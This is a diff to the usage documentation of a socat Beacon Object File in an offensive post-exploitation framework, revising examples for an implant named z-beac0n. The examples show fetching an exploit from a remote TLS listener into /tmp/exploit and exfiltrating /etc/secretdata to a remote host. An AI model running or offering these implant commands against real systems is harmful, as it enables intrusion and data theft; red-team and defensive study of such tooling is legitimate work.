@@ -7,7 +7,7 @@
 ///sources:
 ///    - 'https://raw.githubusercontent.com/The-Z-Labs/bof-launcher/main/bofs/src/socat.zig'
 ///examples: |
-/// socat <src-address> <sink-address>
+/// socat <src-address> <sink-address> [int:BUF_LEN str:BUF_MEMORY_ADDRESS]
 ///
 /// <src-address> - an address that acts as data source
 /// <sink-address> - an address that acts as data sink
@@ -30,9 +30,9 @@
 ///     socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:exploit
 ///
 ///   In the implant:
-///     z-beac0n> socat --argv TLS:remotehost:8443 CREATE:/tmp/exploit
-///   Using cli4bofs:
-///     $ cli4bofs exec socat TLS:remotehost:8443 CREATE:/tmp/exploit
+///     z-beac0n> socat --argv 'TLS:remotehost:8443,cacert CREATE:/tmp/exploit file=./cacert.pem'
+///   From command line:
+///     $ bof exec socat TLS:remotehost:8443 CREATE:/tmp/exploit
 ///
 /// Example use case 2: data exfiltration via TLS channel with z-beac0n:
 ///
@@ -42,9 +42,9 @@
 ///     socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
 ///
 ///   In the implant:
-///     z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443:cacert,cert file=./cacert.pem file=./cert.pem
-///   Using cli4bofs:
-///     $ cli4bofs exec socat CREATE:/tmp/exploit TLS:remotehost:8443
+///     z-beac0n> socat --argv 'OPEN:/etc/secretdata TLS:remotehost:8443:cacert file=./cacert.pem'
+///   From command line:
+///     $ bof exec socat CREATE:/tmp/exploit TLS:remotehost:8443
 ///arguments:
 ///- name: src_address
 ///  desc: "path to a file that will be overwritten"
@@ -55,11 +55,11 @@
 ///  type: string
 ///  required: true
 ///- name: BufLen
-///  desc: "length of UDP probes buffer"
+///  desc: "length of certificate's buffer"
 ///  type: integer
 ///  required: false
 ///- name: BufMemoryAddress
-///  desc: "memory address of UDP probes buffer"
+///  desc: "memory address of a buffer with CA certificate"
 ///  type: string
 ///  required: false
 ///  errors:
